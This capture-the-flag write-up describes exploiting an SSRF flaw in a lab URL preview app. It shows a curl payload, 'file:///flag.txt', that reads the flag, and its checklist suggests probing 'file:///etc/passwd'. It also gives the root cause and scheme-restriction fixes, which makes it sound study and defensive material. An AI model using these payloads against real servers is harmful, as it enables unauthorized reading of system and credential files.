# Flag File Pwnbox Lab - SSRF Local File Read

Date: 2026-07-08
Target type: CTF/lab
Bug class: SSRF, unsafe URL scheme handling, local file disclosure

## Observation

URL preview app at `https://8b034e625be0.pwnbox-lab.com/` fetches a user-supplied URL from the server and displays the response body.

Initial page hints:

- "Preview a URL from the server."
- "The flag is stored locally at `/flag.txt`."

Form:

```html
<form method="post" action="/fetch">
  <input name="url" ... />
</form>
```

Baseline external fetch worked:

```bash
curl -sS -X POST "https://8b034e625be0.pwnbox-lab.com/fetch" -d "url=https://example.com/"
```

Response status: `HTTP 200 OK` with example.com HTML in `<pre>`.

## Hypothesis

Because the lab explicitly mentions a local file path, the fetcher may accept non-HTTP schemes such as `file://` and read filesystem paths from the server context.

## Evidence

Working payload:

```bash
curl -sS -X POST "https://8b034e625be0.pwnbox-lab.com/fetch" -d "url=file:///flag.txt"
```

Response:

```text
status: file read: /flag.txt
body: pwnbox{9e1f42c7a8d603b5f4c2e709a1b86d35}
```

## Test

1. Confirm normal outbound HTTP fetch works.
2. Submit `file:///flag.txt`.
3. Inspect rendered status and `<pre>` body for local file contents.

## Result

Confirmed chain:

```text
User-controlled url parameter
-> server-side fetch primitive
-> file:// scheme accepted
-> /flag.txt read from local filesystem
-> contents reflected in response
```

Flag: `pwnbox{9e1f42c7a8d603b5f4c2e709a1b86d35}`

## Why this worked on first try

- No localhost filter bypass was needed.
- The fetcher explicitly supported filesystem reads via `file://`.
- The response reflected file contents directly.

## Root cause

The URL fetcher treated user input as a generic resource locator without restricting schemes to safe remote protocols only.

## Fix

- Allow only `http://` and `https://`.
- Reject `file://`, `gopher://`, `dict://`, and other non-HTTP schemes.
- Resolve DNS and validate destination IP ranges after parsing.
- Do not reflect fetched content from local resources.

## Future checklist item

For any URL preview/fetch/webhook feature, test `file:///etc/passwd` and the lab-provided local path before parser-confusion bypasses.
